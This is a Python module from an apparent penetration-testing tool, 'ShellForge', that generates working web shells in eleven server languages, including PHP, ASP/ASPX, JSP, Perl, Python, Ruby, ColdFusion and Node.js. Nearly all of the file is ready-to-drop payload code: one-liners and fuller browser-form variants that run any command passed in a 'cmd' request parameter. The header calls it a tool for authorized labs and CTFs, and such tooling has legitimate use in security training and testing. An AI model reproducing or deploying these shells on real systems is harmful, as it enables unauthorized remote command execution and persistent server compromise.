"""
Web shell payload generators for ShellForge.

Standard, well-known templates for authorized labs / CTFs / learning.
Web shells require write access to a target web root.

Author: Mostafa Tamime
"""

from __future__ import annotations

from typing import Callable


# Language key -> (extension, minimal factory, full factory)
# Factories take no args and return the payload string.


def _php_minimal() -> str:
    return "<?php system($_GET['cmd']); ?>"


def _php_full() -> str:
    return """<?php
/* ShellForge PHP web shell — authorized testing only */
error_reporting(0);
$output = '';
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
}
?>
<!DOCTYPE html>
<html>
<head><title>ShellForge</title></head>
<body>
<form method="POST">
  <input type="text" name="cmd" size="60" placeholder="command"
         value="<?php echo isset($_REQUEST['cmd']) ? htmlspecialchars($_REQUEST['cmd']) : ''; ?>"/>
  <input type="submit" value="Run"/>
</form>
<pre><?php echo htmlspecialchars($output); ?></pre>
</body>
</html>
"""


def _php5_minimal() -> str:
    return _php_minimal()


def _php5_full() -> str:
    return _php_full()


def _asp_minimal() -> str:
    return '<%eval request("cmd")%>'


def _asp_full() -> str:
    return """<%
' ShellForge ASP web shell — authorized testing only
On Error Resume Next
Dim cmd, shell, exec, output
cmd = Request("cmd")
If cmd <> "" Then
  Set shell = Server.CreateObject("WScript.Shell")
  Set exec = shell.Exec("cmd /c " & cmd)
  output = exec.StdOut.ReadAll()
End If
%>
<html>
<head><title>ShellForge</title></head>
<body>
<form method="POST">
  <input type="text" name="cmd" size="60" value="<%=Server.HTMLEncode(cmd)%>"/>
  <input type="submit" value="Run"/>
</form>
<pre><%=Server.HTMLEncode(output)%></pre>
</body>
</html>
"""


def _aspx_minimal() -> str:
    return (
        '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>'
        '<script runat="server">void Page_Load(object s,EventArgs e){'
        'if(Request["cmd"]!=null){Process p=new Process();'
        'p.StartInfo.FileName="cmd.exe";'
        'p.StartInfo.Arguments="/c "+Request["cmd"];'
        "p.StartInfo.UseShellExecute=false;"
        "p.StartInfo.RedirectStandardOutput=true;p.Start();"
        "Response.Write(\"<pre>\"+Server.HtmlEncode(p.StandardOutput.ReadToEnd())"
        '+"</pre>");}}</script>'
    )


def _aspx_full() -> str:
    return """<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
/* ShellForge ASPX web shell — authorized testing only */
string output = "";
void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null && Request["cmd"].Length > 0) {
        try {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request["cmd"];
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.Start();
            output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        } catch (Exception ex) {
            output = ex.ToString();
        }
    }
}
</script>
<html>
<head><title>ShellForge</title></head>
<body>
<form method="POST">
  <input type="text" name="cmd" size="60"
         value="<%= Server.HtmlEncode(Request["cmd"] ?? "") %>"/>
  <input type="submit" value="Run"/>
</form>
<pre><%= Server.HtmlEncode(output) %></pre>
</body>
</html>
"""


def _jsp_minimal() -> str:
    return (
        '<%@ page import="java.io.*" %>'
        "<% String c=request.getParameter(\"cmd\");"
        'if(c!=null){Process p=Runtime.getRuntime().exec(c);'
        "InputStream in=p.getInputStream();int i;"
        "while((i=in.read())!=-1){out.write(i);}} %>"
    )


def _jsp_full() -> str:
    return """<%@ page import="java.io.*" %>
<%-- ShellForge JSP web shell — authorized testing only --%>
<%
String cmd = request.getParameter("cmd");
StringBuilder output = new StringBuilder();
if (cmd != null && cmd.length() > 0) {
    try {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        String line;
        while ((line = br.readLine()) != null) { output.append(line).append("\\n"); }
        while ((line = er.readLine()) != null) { output.append(line).append("\\n"); }
    } catch (Exception e) {
        output.append(e.toString());
    }
}
%>
<html>
<head><title>ShellForge</title></head>
<body>
<form method="POST">
  <input type="text" name="cmd" size="60"
         value="<%= cmd == null ? "" : cmd.replace("\\"","&quot;") %>"/>
  <input type="submit" value="Run"/>
</form>
<pre><%= output.toString().replace("<","&lt;") %></pre>
</body>
</html>
"""


def _jspx_minimal() -> str:
    return (
        '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">'
        '<jsp:directive.page import="java.io.*"/>'
        "<jsp:scriptlet>String c=request.getParameter(\"cmd\");"
        "if(c!=null){Process p=Runtime.getRuntime().exec(c);"
        "InputStream in=p.getInputStream();int i;"
        "while((i=in.read())!=-1){out.write(i);}}</jsp:scriptlet>"
        "</jsp:root>"
    )


def _jspx_full() -> str:
    return """<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
  <jsp:directive.page contentType="text/html" import="java.io.*"/>
  <!-- ShellForge JSPX web shell — authorized testing only -->
  <jsp:scriptlet>
    String cmd = request.getParameter("cmd");
    StringBuilder output = new StringBuilder();
    if (cmd != null &amp;&amp; cmd.length() &gt; 0) {
      try {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) { output.append(line).append("\\n"); }
      } catch (Exception e) { output.append(e.toString()); }
    }
  </jsp:scriptlet>
  <html>
    <head><title>ShellForge</title></head>
    <body>
      <form method="POST">
        <input type="text" name="cmd" size="60"/>
        <input type="submit" value="Run"/>
      </form>
      <pre><jsp:expression>output.toString()</jsp:expression></pre>
    </body>
  </html>
</jsp:root>
"""


def _perl_minimal() -> str:
    return (
        "#!/usr/bin/perl\n"
        "use CGI;print \"Content-type: text/plain\\n\\n\";"
        "$c=CGI->new->param('cmd');print `$c` if $c;\n"
    )


def _perl_full() -> str:
    return """#!/usr/bin/perl
# ShellForge Perl CGI web shell — authorized testing only
use CGI;
use CGI::Carp qw(fatalsToBrowser);
my $q = CGI->new;
print $q->header('text/html');
my $cmd = $q->param('cmd') // '';
my $output = '';
if ($cmd ne '') {
    $output = `$cmd 2>&1`;
}
print <<"HTML";
<html><head><title>ShellForge</title></head><body>
<form method="POST">
  <input type="text" name="cmd" size="60" value="$cmd"/>
  <input type="submit" value="Run"/>
</form>
<pre>$output</pre>
</body></html>
HTML
"""


def _python_minimal() -> str:
    return (
        "#!/usr/bin/env python3\n"
        "import cgi,os;print('Content-Type: text/plain\\n');"
        "f=cgi.FieldStorage();c=f.getvalue('cmd','');"
        "print(os.popen(c).read() if c else '')\n"
    )


def _python_full() -> str:
    return '''#!/usr/bin/env python3
# ShellForge Python CGI web shell — authorized testing only
import cgi
import html
import os

print("Content-Type: text/html\\n")
form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "") or ""
output = ""
if cmd:
    try:
        output = os.popen(cmd + " 2>&1").read()
    except Exception as exc:
        output = str(exc)

print("""<!DOCTYPE html>
<html><head><title>ShellForge</title></head><body>
<form method="POST">
  <input type="text" name="cmd" size="60" value="%s"/>
  <input type="submit" value="Run"/>
</form>
<pre>%s</pre>
</body></html>""" % (html.escape(cmd), html.escape(output)))
'''


def _ruby_minimal() -> str:
    return (
        "#!/usr/bin/env ruby\n"
        "require 'cgi';c=CGI.new;print \"Content-Type: text/plain\\r\\n\\r\\n\";"
        "print `#{c['cmd']}` if c['cmd']&&!c['cmd'].empty?\n"
    )


def _ruby_full() -> str:
    return """#!/usr/bin/env ruby
# ShellForge Ruby CGI web shell — authorized testing only
require 'cgi'
require 'erb'
cgi = CGI.new
cmd = cgi['cmd'].to_s
output = ''
begin
  output = `#{cmd} 2>&1` unless cmd.empty?
rescue => e
  output = e.to_s
end
print "Content-Type: text/html\\r\\n\\r\\n"
print <<HTML
<html><head><title>ShellForge</title></head><body>
<form method="POST">
  <input type="text" name="cmd" size="60" value="#{ERB::Util.html_escape(cmd)}"/>
  <input type="submit" value="Run"/>
</form>
<pre>#{ERB::Util.html_escape(output)}</pre>
</body></html>
HTML
"""


def _cfm_minimal() -> str:
    return (
        '<cfexecute name="#URL.cmd#" timeout="5" variable="out"></cfexecute>'
        "<cfoutput>#out#</cfoutput>"
    )


def _cfm_full() -> str:
    return """<!--- ShellForge ColdFusion web shell — authorized testing only --->
<cfparam name="form.cmd" default="">
<cfset output = "">
<cfif Len(form.cmd)>
  <cftry>
    <cfexecute name="cmd.exe" arguments="/c #form.cmd#" timeout="10" variable="output"></cfexecute>
    <cfcatch>
      <cfset output = cfcatch.message>
    </cfcatch>
  </cftry>
</cfif>
<html>
<head><title>ShellForge</title></head>
<body>
<form method="POST">
  <input type="text" name="cmd" size="60" value="<cfoutput>#HTMLEditFormat(form.cmd)#</cfoutput>"/>
  <input type="submit" value="Run"/>
</form>
<pre><cfoutput>#HTMLEditFormat(output)#</cfoutput></pre>
</body>
</html>
"""


def _nodejs_minimal() -> str:
    return (
        "require('http').createServer((q,s)=>{"
        "const u=require('url').parse(q.url,true);"
        "require('child_process').exec(u.query.cmd||'',(e,o)=>{"
        "s.end(o||String(e));});}).listen(8080);"
    )


def _nodejs_full() -> str:
    return """// ShellForge Node.js web shell — authorized testing only
// Run: node shell.js  (listens on 8080)
const http = require('http');
const { exec } = require('child_process');
const url = require('url');

http.createServer((req, res) => {
  const q = url.parse(req.url, true).query;
  let body = '';
  req.on('data', (c) => { body += c; });
  req.on('end', () => {
    let cmd = q.cmd || '';
    if (!cmd && body) {
      try {
        const params = new URLSearchParams(body);
        cmd = params.get('cmd') || '';
      } catch (e) { /* ignore */ }
    }
    const form = `<!DOCTYPE html><html><head><title>ShellForge</title></head><body>
<form method="POST"><input type="text" name="cmd" size="60" value="${(cmd||'').replace(/"/g,'&quot;')}"/>
<input type="submit" value="Run"/></form><pre>`;
    if (!cmd) {
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(form + '</pre></body></html>');
      return;
    }
    exec(cmd, (err, stdout, stderr) => {
      res.writeHead(200, {'Content-Type': 'text/html'});
      res.end(form + (stdout || '') + (stderr || '') + (err ? String(err) : '') + '</pre></body></html>');
    });
  });
}).listen(8080, () => console.log('ShellForge listening on :8080'));
"""


WEBSHELL_LANGS: dict[str, tuple[str, Callable[[], str], Callable[[], str]]] = {
    "php": (".php", _php_minimal, _php_full),
    "php5": (".php5", _php5_minimal, _php5_full),
    "asp": (".asp", _asp_minimal, _asp_full),
    "aspx": (".aspx", _aspx_minimal, _aspx_full),
    "jsp": (".jsp", _jsp_minimal, _jsp_full),
    "jspx": (".jspx", _jspx_minimal, _jspx_full),
    "perl": (".pl", _perl_minimal, _perl_full),
    "python": (".py", _python_minimal, _python_full),
    "ruby": (".rb", _ruby_minimal, _ruby_full),
    "cfm": (".cfm", _cfm_minimal, _cfm_full),
    "nodejs": (".js", _nodejs_minimal, _nodejs_full),
}


class WebShellGenerator:
    """
    Web shell generator for a single language.

    Implements minimal() / full() (not reverse/bind). Used when CLI type is webshell.
    """

    def __init__(self, lang: str) -> None:
        if lang not in WEBSHELL_LANGS:
            raise ValueError(f"Unsupported webshell language: {lang}")
        self.lang = lang
        self._ext, self._minimal, self._full = WEBSHELL_LANGS[lang]

    def minimal(self) -> str:
        """Smallest functional one-liner / upload stub."""
        return self._minimal()

    def full(self) -> str:
        """Browser form + output (slightly more complete)."""
        return self._full()

    def generate(self, variant: str = "minimal") -> str:
        if variant == "full":
            return self.full()
        if variant == "minimal":
            return self.minimal()
        raise ValueError(f"Unknown webshell variant: {variant}")

    def file_extension(self) -> str:
        return self._ext

    # Compatibility shims so shared CLI helpers can treat this like other generators
    def reverse(self, ip: str, port: int) -> str:
        raise TypeError("Web shells do not use reverse(); use -t webshell")

    def bind(self, port: int) -> str:
        raise TypeError("Web shells do not use bind(); use -t webshell")


def list_webshell_languages() -> list[str]:
    """Return supported webshell language keys in stable order."""
    return list(WEBSHELL_LANGS.keys())


def get_webshell_generator(lang: str) -> WebShellGenerator:
    return WebShellGenerator(lang.lower())
